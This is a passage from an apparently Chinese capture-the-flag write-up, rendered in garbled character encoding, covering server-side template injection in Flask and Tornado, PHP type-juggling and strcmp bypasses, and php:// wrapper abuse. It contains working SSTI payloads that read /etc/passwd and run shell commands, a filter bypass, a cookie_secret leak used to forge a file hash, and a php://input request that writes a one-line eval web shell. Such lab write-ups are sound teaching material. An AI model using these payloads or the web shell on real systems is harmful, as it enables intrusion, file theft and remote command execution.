<li>è€Œæ¨¡æ¿æ–‡ä»¶é‡Œï¼Œå°†<code>&#123;&#123;placeholder&#125;&#125;</code>ç†è§£ä¸ºå ä½ç¬¦ï¼Œå°±æ˜¯å˜é‡ï¼Œçœ‹HTMLæ¨¡æ¿ä»£ç ä¸­ï¼Œæœ‰ç±»ä¼¼<code>&#123;&#123;username&#125;&#125;</code>çš„å˜é‡ï¼Œæ¨¡æ¿ä¸­ç”¨`{{}}`å¼•å…¥å˜é‡ï¼Œè¿™ä¸ªå˜é‡å°±æ˜¯åœ¨self.render()ä¸­è§„å®šçš„ï¼Œä¸¤è€…å˜é‡åç§°ä¸€è‡´ï¼Œå¯¹åº”å°†ç›¸åº”çš„å€¼å¯¹è±¡å¼•å…¥åˆ°æ¨¡æ¿ä¸­
- ç”¨``çš„æ–¹å¼ï¼Œå°†ä¸€ä¸ªå­—ç¬¦ä¸²èµ‹ç»™äº†å˜é‡varï¼Œç„¶åå°±å¯ä»¥ç›´æ¥å¼•ç”¨è¿™ä¸ªå˜é‡äº†ï¼špython-tornadoã€‚è¿™æ ·å°±æ˜¯å®ç°äº†æ¨¡æ¿ä¸­å˜é‡çš„ä½¿ç”¨</li>
</ul>
<h5 id="ssti">SSTI</h5>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/author/å’Œè”¼çš„æ¨å°äºŒ">freebuf
ä»é›¶å­¦ä¹ flaskæ¨¡æ¿æ³¨å…¥**</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/96480967">csdn
SSTIå®Œå…¨å­¦ä¹ +å·¥å…·Tplmapå®ä¾‹</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Goodric/article/details/115170932?utm_source=app&amp;app_version=4.20.0">csdnåˆè¯†
SSTI æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œæœ‰py2+py3çš„payload</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">ğŸ› æ¨¡æ¿æ³¨å…¥ï¼Œå·¥å…·Tplmap**</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2908">æºç +ctfä¾‹é¢˜ï¼šPythonä¸­ä»æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥åˆ°æ²™ç›’é€ƒé€¸çš„æºç æ¢ç´¢
(ä¸€)</a></p>
</blockquote>
<p>SSTIå°±æ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥(Server-Side Template Injection)</p>
<ul>
<li>SSTIä¹Ÿæ˜¯è·å–äº†ä¸€ä¸ªè¾“å…¥ï¼Œç„¶åå†åç«¯çš„æ¸²æŸ“å¤„ç†ä¸Šè¿›è¡Œäº†è¯­å¥çš„æ‹¼æ¥ï¼Œç„¶åæ‰§è¡Œã€‚å½“ç„¶è¿˜æ˜¯å’Œsqlæ³¨å…¥æœ‰æ‰€ä¸åŒçš„ï¼ŒSSTIåˆ©ç”¨çš„æ˜¯ç°åœ¨çš„ç½‘ç«™æ¨¡æ¿å¼•æ“(ä¸‹é¢ä¼šæåˆ°)ï¼Œä¸»è¦é’ˆå¯¹pythonã€phpã€javaçš„ä¸€äº›ç½‘ç«™å¤„ç†æ¡†æ¶ï¼Œæ¯”å¦‚<span style="background:#FF9999;">Pythonçš„jinja2(Flask) mako tornado
djangoï¼Œphpçš„smarty twigï¼Œjavaçš„jade
velocity</span>ã€‚å½“è¿™äº›æ¡†æ¶å¯¹è¿ç”¨æ¸²æŸ“å‡½æ•°ç”Ÿæˆhtmlçš„æ—¶å€™ä¼šå‡ºç°SSTIçš„é—®é¢˜ã€‚</li>
</ul>
<h6 id="xssåˆ©ç”¨">XSSåˆ©ç”¨</h6>
<pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/test/&#x27;)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>
    code = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)
    html = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">        &lt;h3&gt;%s&lt;/h3&gt;</span>
<span class="hljs-string">    &#x27;&#x27;&#x27;</span>%(code)   //pythoné‡Œçš„ä¸‰å¼•å·æŒ‡å¤šè¡Œä»£ç ï¼Œ%sæŒ‡å­—ç¬¦ä¸²ï¼Œç”±å˜é‡codeå¡«å……
    <span class="hljs-keyword">return</span> render_template_string(html)</code></pre>
<p>è¿™æ®µä»£ç å­˜åœ¨æ¼æ´çš„åŸå› æ˜¯æ•°æ®å’Œä»£ç çš„æ··æ·†ã€‚<strong>ä»£ç ä¸­çš„<code>code</code>æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œä¼šå’Œhtmlæ‹¼æ¥åç›´æ¥å¸¦å…¥æ¸²æŸ“</strong>ã€‚</p>
<p>å°è¯•æ„é€ codeä¸ºä¸€ä¸²jsä»£ç ï¼Œä¼šæ‰§è¡Œjsï¼Œå¼¹çª—ã€‚</p>
<p>è€Œä»¥ä¸‹ä»£ç ï¼š</p>
<pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/test/&#x27;)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>
    code = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)
    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&lt;h1&gt;&#123;&#123; code &#125;&#125;&lt;/h1&gt;&#x27;</span>,code=code)</code></pre>
<p>jsä»£ç è¢«åŸæ ·è¾“å‡ºäº†ã€‚<strong>è¿™æ˜¯å› ä¸ºæ¨¡æ¿å¼•æ“ä¸€èˆ¬éƒ½é»˜è®¤å¯¹æ¸²æŸ“çš„å˜é‡å€¼(çŒœæµ‹æ˜¯`{{}}`)è¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œè¿™æ ·å°±ä¸ä¼šå­˜åœ¨xssäº†**ã€‚åœ¨è¿™æ®µä»£ç ä¸­ç”¨æˆ·**æ‰€æ§çš„æ˜¯codeå˜é‡ï¼Œè€Œä¸æ˜¯æ¨¡æ¿å†…å®¹**ã€‚**å­˜åœ¨æ¼æ´çš„ä»£ç ä¸­ï¼Œæ¨¡æ¿å†…å®¹ç›´æ¥å—ç”¨æˆ·æ§åˆ¶çš„**ã€‚

ä¸ä»…å¯ä»¥xssï¼Œè¿˜å¯ä»¥è¿›è¡Œå…¶ä»–æ”»å‡»

###### SSTIæ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œ

<pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/test/&#x27;)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>
    code = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)
    html = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">        &lt;h3&gt;%s&lt;/h3&gt;</span>
<span class="hljs-string">    &#x27;&#x27;&#x27;</span>%(code)
    <span class="hljs-keyword">return</span> render_template_string(html)</code></pre>

æ„é€ å‚æ•°8ï¼Œè¿”å›æ‰§è¡Œç»“æœ8ï¼Œ</strong>å¯ä»¥çœ‹åˆ°è¡¨è¾¾å¼è¢«æ‰§è¡Œäº†ã€‚**</p>
<p>é‚£ä¹ˆå¯ä»¥<strong>é€šè¿‡pythonçš„å¯¹è±¡çš„ç»§æ‰¿ã€åˆ©ç”¨å¯ç”¨å­ç±»çš„æ–¹æ³•æ¥ä¸€æ­¥æ­¥å®ç°æ–‡ä»¶è¯»å–å’Œå‘½ä»¤æ‰§è¡Œï¼Œå…·ä½“çœ‹å‚è€ƒé“¾æ¥</strong></p>
<p>åˆ©ç”¨ï¼šã€<span style="background:#FF9999;">å› ä¸ºä½ç½®å¯èƒ½ä¸åŒï¼Œæ‰€ä»¥ç”¨ifæŸ¥æ‰¾</span>ã€‘</p>
<ul>
<li>==è¯»æ–‡ä»¶ï¼š==</li>
</ul>
<pre><code class="hljs markdown">&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;   //py2
è¿˜æœ‰:
().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">r&#x27;C:\1.php&#x27;</span>).read()

object.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">r&#x27;C:\1.php&#x27;</span>).read()

æ›´ä¿é™©ï¼š
 &#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if
 c.<span class="hljs-strong">__name__</span>==&#x27;catch<span class="hljs-emphasis">_warnings&#x27; %&#125;&#123;&#123;</span>
<span class="hljs-emphasis"> c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].open(&#x27;åœ¨è¿™é‡Œè¾“å…¥æ–‡ä»¶å&#x27;, &#x27;r&#x27;).read()</span>
<span class="hljs-emphasis"> &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 		//py3</span></code></pre>
<ul>
<li>==å†™æ–‡ä»¶==</li>
</ul>
<pre><code class="hljs markdown">//å†™æ–‡ä»¶
().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;</span>).write(&#x27;123&#x27;)
object.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;</span>).write(&#x27;123&#x27;)</code></pre>
<ul>
<li>==å‘½ä»¤æ‰§è¡Œ==</li>
</ul>
<pre><code class="hljs markdown">&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[2].<span class="hljs-strong">__subclasses__</span>()[71].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;os&#x27;].system(&#x27;ls&#x27;)
&#125;&#125;
è¿˜æœ‰ï¼š
().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.func<span class="hljs-emphasis">_globals.values()[<span class="hljs-string">13</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&#x27;<span class="hljs-strong">__import__</span>(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span>
<span class="hljs-emphasis"></span>
<span class="hljs-emphasis">&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if</span>
<span class="hljs-emphasis">c.<span class="hljs-strong">__name__</span>==&#x27;catch_</span>warnings&#x27; %&#125;&#123;&#123;
c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].eval(&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;  	//py3</code></pre>
<p>æ„é€ paylaodçš„æ€è·¯å’Œæ„é€ æ–‡ä»¶è¯»å–çš„æ˜¯ä¸€æ ·çš„ã€‚åªä¸è¿‡å‘½ä»¤æ‰§è¡Œçš„ç»“æœæ— æ³•ç›´æ¥çœ‹åˆ°ï¼Œéœ€è¦åˆ©ç”¨curlå°†ç»“æœå‘é€åˆ°è‡ªå·±çš„vpsæˆ–è€…åˆ©ç”¨ceye)</p>
<p><span style="background:#FF9999;">æµ‹è¯•æ˜¯å¦æœ‰æ³¨å…¥ç‚¹ 2
ä¹‹ç±»çš„ï¼ŒæˆåŠŸæ‰§è¡Œåˆ™è¯´æ˜æœ‰æ¨¡ç‰ˆæ³¨å…¥</span></p>
<h6 id="ä¸‹åˆ’çº¿è¢«è¿‡æ»¤">ä¸‹åˆ’çº¿è¢«è¿‡æ»¤ï¼Ÿ</h6>
<p>å¯ä»¥ç”¨request.argsè·å–getå‚æ•°ç»•è¿‡</p>
<p>ä¾‹å¦‚</p>
<pre><code class="hljs markdown">http://e0579dc296f4fa31220536d95e3b68b5.challenge.mini.lctf.online:1080/?class=<span class="hljs-strong">__class__</span>&amp;mro=<span class="hljs-strong">__mro__</span>&amp;subclasses=<span class="hljs-strong">__subclasses__</span>&amp;init=<span class="hljs-strong">__init__</span>&amp;globals=<span class="hljs-strong">__globals__</span>&amp;popen=popen&amp;cmd=cat /flag

&#123;&#123;()[<span class="hljs-string">request.args.class</span>][<span class="hljs-symbol">request.args.mro</span>][<span class="hljs-string">-1</span>][<span class="hljs-symbol">request.args.subclasses</span>]()[<span class="hljs-string">127</span>][<span class="hljs-symbol">request.args.init</span>][<span class="hljs-string">request.args.globals</span>][<span class="hljs-symbol">request.args.popen</span>](request.args.cmd).read() &#125;&#125;</code></pre>
<h4 id="è§£é¢˜">è§£é¢˜</h4>
<p>flag in /fllllllllllllag</p>
<p>md5(cookie_secret+md5(filename))</p>
<p>é’ˆå¯¹æŠ¥é”™ç•Œé¢çš„/error?msg=Errorå°è¯•æ¨¡æ¿æ³¨å…¥</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227211937496.png" srcset="/img/loading.gif" alt="image-20220227211937496"></p>
<p>è¾“å…¥/error?msg=2ï¼Œè¿”å›2</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228210519796.png" srcset="/img/loading.gif" alt="image-20220228210519796"></p>
<p>/error?msg=8ï¼Œè¿”å›ORZ</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228210447911.png" srcset="/img/loading.gif" alt="image-20220228210447911"></p>
<p><code>/error?msg=&#123;&#123;4/2&#125;&#125;</code>ï¼Œé™¤å’Œå‡ä¹Ÿæ˜¯è¿”å›ORZï¼Œ<code>/error?msg=&#123;&#123;*&#125;&#125;</code>ã€<code>/error?msg=&#123;&#123;_&#125;&#125;</code>ä¹Ÿæ˜¯è¿”å›ORZï¼Œåº”è¯¥æ˜¯è¿‡æ»¤äº†ç‰¹æ®Šå­—ç¬¦</p>
<h6 id="æ€ä¹ˆæ‰¾cookie_secretå‘¢">æ€ä¹ˆæ‰¾cookie_secretå‘¢ï¼Ÿ</h6>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c4070d6f4249">å…·ä½“åˆ†æï¼Œæºç </a></p>
</blockquote>
<p>æŸ¥çœ‹wpå‘ç°<strong>ç”¨çš„å°±æ˜¯handler.settingså¯¹è±¡</strong></p>
<ol type="1">
<li>ä»€ä¹ˆæ˜¯cookie_secret? <a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/guide/security.html">tornadoæ–‡æ¡£</a>é‡Œçš„éƒ¨åˆ†æºç ï¼š</li>
</ol>
<pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainHandler</span>(<span class="hljs-params">BaseHandler</span>):</span>
<span class="hljs-meta">    @tornado.web.authenticated</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span>
        name = tornado.escape.xhtml_escape(self.current_user)
        self.write(<span class="hljs-string">&quot;Hello, &quot;</span> + name)

settings = &#123;
    <span class="hljs-string">&quot;cookie_secret&quot;</span>: <span class="hljs-string">&quot;__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__&quot;</span>,
    <span class="hljs-string">&quot;login_url&quot;</span>: <span class="hljs-string">&quot;/login&quot;</span>,
&#125;
application = tornado.web.Application([
    (<span class="hljs-string">r&quot;/&quot;</span>, MainHandler),
    (<span class="hljs-string">r&quot;/login&quot;</span>, LoginHandler),
], **settings)</code></pre>
<p>settingsä¸­çš„å±æ€§"cookie_secret"ï¼ˆåº”è¯¥æ˜¯ä¸€ä¸ªç»è¿‡HMACåŠ å¯†çš„å¤Ÿé•¿ä¸”éšæœºçš„å­—èŠ‚åºåˆ—ï¼‰</p>
<p>settingsåˆä½œä¸ºå‚æ•°ä¼ å…¥äº†Applicationç±»æ„é€ å‡½æ•°</p>
<p><strong>å› æ­¤å¯ä»¥é€šè¿‡<code>self.application.settings</code>è·å–åˆ°cookie_secret</strong></p>
<ol start="2" type="1">
<li><p>RequestHandlerç±»ä¸­çš„ä¸€ä¸ªæ–¹æ³•<strong>å°†RequestHandlerç±»æœ¬èº«èµ‹å€¼ç»™äº†handler</strong>ï¼Œå› æ­¤handler.settingså®é™…ä¸Šå°±æ˜¯RequestHandler.settingsï¼ˆself.settingï¼‰ã€å³<code>handler</code>å°±ç­‰äº
<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.tornadoweb.org%2Fen%2Flatest%2Fweb.html%23tornado.web.RequestHandler"><code>RequestHandler</code></a>
ã€‘</p></li>
<li><p><code>RequestHandler.settings</code>åˆ«å
<code>self.application.settings</code></p></li>
<li><p>åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡,è¿™é‡Œç”¨åˆ°çš„æ˜¯handler.settingsï¼Œhandler
æŒ‡å‘RequestHandlerï¼Œè€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settingsï¼Œæ‰€ä»¥<code>handler.settings</code>å°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼Œè¿™é‡Œé¢å°±æ˜¯æˆ‘ä»¬çš„ä¸€äº›<strong><em>ç¯å¢ƒå˜é‡</em></strong></p></li>
</ol>
<p>==ç®€å•è€Œè¨€é€šè¿‡<code>&#123;&#123;handler.application.settings&#125;&#125;</code>æˆ–è€…<code>&#123;&#123;handler.settings&#125;&#125;</code>å°±å¯è·å¾—<code>settings</code>ä¸­çš„<strong>cookie_secret</strong>ã€‚==</p>
<p><code>/error?msg=&#123;&#123;handler.settings&#125;&#125;</code>å¾—åˆ°cookie_secret:9d1f67f0-bb20-4878-a71e-16da5ce18c57</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211001182.png" srcset="/img/loading.gif" alt="image-20220228211001182"></p>
<p>â—æ³¨æ„ï¼Œè¿™ä¸ªä¸æŠ“åŒ…é‡Œçš„cookieæ— å…³</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211146954.png" srcset="/img/loading.gif" alt="image-20220228211146954"></p>
<p>è®¡ç®—filehash:md5(cookie_secret+md5(filename))</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$a=<span class="hljs-string">&#x27;9d1f67f0-bb20-4878-a71e-16da5ce18c57&#x27;</span>;
$b=<span class="hljs-string">&#x27;/fllllllllllllag&#x27;</span>;
<span class="hljs-comment">//echo $a.$b;</span>
<span class="hljs-keyword">echo</span> md5($a.md5($b));</code></pre>
<p>payloadï¼š</p>
<pre><code class="hljs sas">/<span class="hljs-meta">file</span>?<span class="hljs-meta">filename</span>=/fllllllllllllag<span class="hljs-variable">&amp;filehash</span>=f0c23d729e726f692178be3dda2f2b4b</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211604055.png" srcset="/img/loading.gif" alt="image-20220228211604055"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019buyflagæ˜“">[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlagï¼ˆæ˜“ï¼‰</h2>
<h4 id="è€ƒç‚¹å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡æ•°æ®é•¿åº¦é™åˆ¶strcmp">è€ƒç‚¹ï¼šå¼±ç±»å‹æ¯”è¾ƒã€ç»•è¿‡æ•°æ®é•¿åº¦é™åˆ¶ã€strcmp</h4>
<p>ç‚¹è¿›èœå•çš„payflagï¼Œæç¤º:</p>
<pre><code class="hljs erlang-repl">If you want to buy the FLAG:
You must be a student from CUIT!!!
You must be answer the correct password!!!</code></pre>
<p>åœ¨æºç é‡Œå‘ç°æç¤º</p>
<pre><code class="hljs php">	~~~post money <span class="hljs-keyword">and</span> password~~~
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;
	$password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];
	<span class="hljs-keyword">if</span> (is_numeric($password)) &#123;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;
	&#125;<span class="hljs-keyword">elseif</span> ($password == <span class="hljs-number">404</span>) &#123;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;
	&#125;
&#125;</code></pre>
<p>å…³äºYou must be a student from
CUIT!!!ï¼Œå°è¯•ä¿®æ”¹refererä¸å¯¹ï¼Œå‘ç°cookieï¼šuser=0ï¼Œä¿®æ”¹ä¸ºCUITä¹Ÿä¸å¯¹ï¼Œä¿®æ”¹ä¸º1ï¼Œæ­£ç¡®</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305161122799.png" srcset="/img/loading.gif" alt="image-20220305161122799"></p>
<p>ç»•è¿‡passwordï¼š</p>
<pre><code class="hljs erlang-repl">password=<span class="hljs-number">404</span>    ==ã€‹password can&#x27;t be number
password=<span class="hljs-string">&#x27;404&#x27;</span>  ==ã€‹Wrong Password!!   ==ã€‹ç»™çš„æ˜¯éƒ¨åˆ†phpæºç 
password=<span class="hljs-number">404</span>a   ==ã€‹Password Right!Pay for the flag!!!hacker!!!</code></pre>
<p>æ ¹æ®Flag need your 100000000 moneyï¼ŒçŒœæµ‹è¿˜æœ‰ä¸ªå‚æ•°money</p>
<pre><code class="hljs lsl">password=<span class="hljs-number">404</span>a&amp;<span class="hljs-section">money</span>=<span class="hljs-number">100000000</span>  ==ã€‹Password Right!&lt;/br&gt;Nember lenth is too long&lt;/br&gt;
password=<span class="hljs-number">404</span>a&amp;<span class="hljs-section">money</span>=<span class="hljs-number">100</span>  ==&gt;&gt;Password Right!&lt;/br&gt;you have not enough <span class="hljs-section">money</span>,loser~&lt;/br&gt;	
ç”¨ç§‘å­¦è®¡æ•°æ³•,<span class="hljs-number">1e10</span>å³<span class="hljs-number">1</span>*<span class="hljs-number">10</span>çš„<span class="hljs-number">10</span>æ¬¡æ–¹ï¼Œå¤§äºç­‰äº<span class="hljs-number">9</span>å°±èƒ½ä¹°äº†
password=<span class="hljs-number">404</span>a&amp;<span class="hljs-section">money</span>=<span class="hljs-number">1e10</span>  ==&gt;&gt;Password Right!&lt;/br&gt;flag&#123;fb7ec519<span class="hljs-number">-90e9</span><span class="hljs-number">-47</span>d4<span class="hljs-number">-92</span>cf-ba9b204eeb54&#125;</code></pre>
<blockquote>
<p><strong>åœ¨</strong><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/ç§‘å­¦è®¡æ•°æ³•">ç§‘å­¦è®¡æ•°æ³•</a><strong>ä¸­ï¼Œä¸ºäº†ä½¿å…¬å¼ç®€ä¾¿ï¼Œå¯ä»¥ç”¨å¸¦â€œEâ€çš„æ ¼å¼è¡¨ç¤ºã€‚å½“ç”¨è¯¥æ ¼å¼è¡¨ç¤ºæ—¶ï¼ŒEå‰é¢çš„æ•°å­—å’Œâ€œE+â€åé¢è¦ç²¾ç¡®åˆ°ååˆ†ä½ï¼Œï¼ˆä½æ•°ä¸å¤Ÿæœ«å°¾è¡¥0ï¼‰,ä¾‹å¦‚7.8ä¹˜10çš„7æ¬¡æ–¹ï¼Œæ­£å¸¸å†™æ³•ä¸ºï¼š7.8x10^7,ç®€å†™ä¸ºâ€œ7.8E+07â€çš„å½¢å¼</strong></p>
</blockquote>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305161955432.png" srcset="/img/loading.gif" alt="image-20220305161955432"></p>
<p>æ›´å¤šæ–¹æ³•ï¼š</p>
<p>ç»•numericçš„ï¼š</p>
<blockquote>
<p><strong><em>is_numberic():å°±æ˜¯åˆ¤æ–­æ‹¬å·é‡Œé¢çš„å˜é‡æ˜¯ä¸æ˜¯æ•°å€¼</em></strong>
æ¼æ´ç»•è¿‡ï¼šis_numericå‡½æ•°å¯¹äºç©ºå­—ç¬¦%00ï¼Œæ— è®ºæ˜¯%00æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ%20ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼åã€‚</p>
</blockquote>
<pre><code class="hljs angelscript">åœ¨åé¢åŠ ä¸Š%<span class="hljs-number">20</span>è·³è¿‡ï¼š<span class="hljs-number">404</span>%<span class="hljs-number">20</span></code></pre>
<p>ç»•moneyçš„ï¼š<strong>é•¿åº¦æœ‰é—®é¢˜ï¼Œåº”è¯¥æ˜¯strcmpå‡½æ•°æ£€æµ‹çš„</strong></p>
<blockquote>
<p>strcmpå‡½æ•°æ¼æ´ï¼šstrcmpæ¯”è¾ƒçš„æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œå¦‚æœå¼ºè¡Œä¼ å…¥å…¶ä»–ç±»å‹å‚æ•°ï¼Œä¼šå‡ºé”™ï¼Œå‡ºé”™åè¿”å›å€¼NULLï¼Œ<strong>NULL==0</strong>ï¼Œæ­£æ˜¯åˆ©ç”¨è¿™ç‚¹è¿›è¡Œç»•è¿‡</p>
</blockquote>
<pre><code class="hljs cpp">money[]å¯ä»¥ç»•å¼€<span class="hljs-built_in">strcmp</span>å‡½æ•°</code></pre>
<h2 id="zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</h2>
<h4 id="è€ƒç‚¹flle_get_contents-ä¼ªåè®®å­—ç¬¦æ¯”è¾ƒååºåˆ—åŒ–echo-tostring">è€ƒç‚¹ï¼šflle_get_contents()
ã€ä¼ªåè®®å­—ç¬¦æ¯”è¾ƒã€ååºåˆ—åŒ–echo tostring</h4>
<h4 id="php">php://</h4>
<ul>
<li><strong>æ¡ä»¶</strong>ï¼š
<ul>
<li><code>allow_url_fopen</code>:off/on</li>
<li><code>allow_url_include</code>
:ä»…<code>php://input php://stdin php://memory php://temp</code>éœ€è¦on</li>
</ul></li>
</ul>
<p>php://filterç”¨äºè¯»å–æºç ï¼Œphp://inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚</p>
<table>
<colgroup>
<col style="width: 16%">
<col style="width: 83%">
</colgroup>
<thead>
<tr class="header">
<th>åè®®</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>php://input</td>
<td>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨POSTè¯·æ±‚ä¸­è®¿é—®POSTçš„<code>data</code>éƒ¨åˆ†ï¼Œ==åœ¨<code>enctype="multipart/form-data"</code>
çš„æ—¶å€™<code>php://input</code>æ˜¯æ— æ•ˆçš„ã€‚==</td>
</tr>
<tr class="even">
<td>php://filter</td>
<td>(&gt;=5.0.0)ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚å¯¹äºä¸€ä½“å¼<code>ï¼ˆall-in-oneï¼‰</code>çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œ<strong>ç±»ä¼¼
<code>readfile()</code>ã€<code>file()</code> å’Œ
<code>file_get_contents()</code></strong>ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚</td>
</tr>
</tbody>
</table>
<pre><code class="hljs php">ç¤ºä¾‹ï¼š
http:<span class="hljs-comment">//127.0.0.1/include.php?file=php://input</span>
[POST DATAéƒ¨åˆ†]
<span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span>

å†™å…¥ä¸€å¥è¯ï¼š
http:<span class="hljs-comment">//127.0.0.1/include.php?file=php://input</span>
[POST DATAéƒ¨åˆ†]
<span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;1juhua.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span></code></pre>
<h4 id="date">date://</h4>
<ul>
<li><p><strong>æ¡ä»¶</strong>ï¼š</p>
<ul>
<li><p><code>allow_url_fopen</code>:on</p></li>
<li><p><code>allow_url_include</code> :on</p></li>
